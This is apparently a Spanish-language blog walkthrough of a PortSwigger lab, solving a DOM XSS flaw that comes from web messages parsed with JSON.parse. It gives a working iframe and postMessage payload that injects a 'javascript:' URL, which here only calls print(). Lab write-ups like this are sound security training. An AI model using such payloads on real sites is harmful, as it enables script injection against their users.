---
title: "DOM Based Vulnerabilities Lab 3"
date: 2025-01-19 12:25:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - DOM Based Vulnerabilities
tags:
  - DOM Based Vulnerabilities
  - DOM XSS using web messages and JSON.parse
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Skills

- DOM XSS using web messages and JSON.parse
  
## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` utiliza `mensajes web` y analiza el `mensaje` como `JSON`. Para `resolver` el `laboratorio`, debemos construir una página `HTML` en el `servidor de exploits` que `explote` esta `vulnerabilidad` y llame a la función `print()`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/DOM-Based-Vulnerabilities-Lab-3/image_1.png)

Me llama la atención la `carga` del `objeto`, si `inspeccionamos` el `código fuente` vemos que la `ventana` tiene un `listener` y si `enviamos` un `mensaje` este se `mostrará` en la `web`

![](/assets/img/DOM-Based-Vulnerabilities-Lab-3/image_2.png)

Para `enviar` un `mensaje` podemos usar `window.postMessage`, el `mensaje` debe `contener` un `string` en `formato JSON`. Al proporcionar los parámetros `type: 'load channel'` y `url: 'https://0afc00da04b221f285fd3b08005c00c2.web-security-academy.net/'` el script nos crea un `iframe` cuya `url` es la proporcionada

```
window.postMessage(JSON.stringify({type: 'load-channel', url: 'https://0afc00da04b221f285fd3b08005c00c2.web-security-academy.net/'}));
```

![](/assets/img/DOM-Based-Vulnerabilities-Lab-3/image_3.png)

Como nos esta `cargando` una `url` podemos usar `javascript:print()` para `ejecutar código` JavaScript

```
window.postMessage(JSON.stringify({type: 'load-channel', url: 'javascript:print()'}));
```

![](/assets/img/DOM-Based-Vulnerabilities-Lab-3/image_4.png)

A continuación nos vamos al `exploit server` e `insertamos` este `payload`. Este `payload` nos `carga` la `url` de la `web vulnerable` y `cuando se ha cargado enviamos un mensaje con el payload desde dentro del iframe`

```
<iframe src="https://0afc00da04b221f285fd3b08005c00c2.web-security-academy.net/" onload="this.contentWindow.postMessage(JSON.stringify({type: 'load-channel', url: 'javascript:print()'}), '*')">
```

Si pulsamos sobre `View exploit` se nos `cargará` el `iframe` y también se mostrará un `print()`. Si pulsamos en `Deliver exploit to victim` estaremos enviando a la víctima la `url` de nuestro servidor `https://exploit-0a9b002b0485218685773a2501aa0098.exploit-server.net/exploit` en el cual `alojamos` el `exploit`

![](/assets/img/DOM-Based-Vulnerabilities-Lab-3/image_5.png)
